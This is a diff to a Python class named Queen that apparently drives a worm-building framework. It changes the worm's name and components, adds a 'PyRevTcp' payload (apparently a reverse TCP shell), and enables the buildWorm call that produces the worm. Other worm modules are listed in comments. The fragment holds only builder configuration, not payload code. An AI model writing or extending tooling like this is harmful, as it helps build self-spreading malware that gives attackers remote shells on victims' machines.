@@ -47,9 +47,10 @@ class Queen:
         self.msg("msg", "Test HIVE")
         conf = {}
         #self.master_compiler.coreInstall("CrossCompCore")
-        self.rawBuilder.setWormName("szelx")
-        self.rawBuilder.Add("worm", "WShellcode")
-        self.rawBuilder.Add("scode", "MsgBoxA")
+        self.rawBuilder.setWormName("pejjjj")
+        self.rawBuilder.Add("worm", "PayTest")
+        self.rawBuilder.Add("payload", "PyRevTcp")
+        # self.rawBuilder.Add("scode", "MsgBoxA")
         #self.rawBuilder.Add("worm", "Asmek")
         # self.rawBuilder.Add("worm", "Montezuma")
         # self.rawBuilder.Add("module", "PyRawTcp")
@@ -64,7 +65,7 @@ class Queen:
 
         # self.rawBuilder.test()
         self.rawBuilder.showWorm()
-        #self.wormConstructor.buildWorm(options=conf)
+        self.wormConstructor.buildWorm(options=conf)
 
     
         
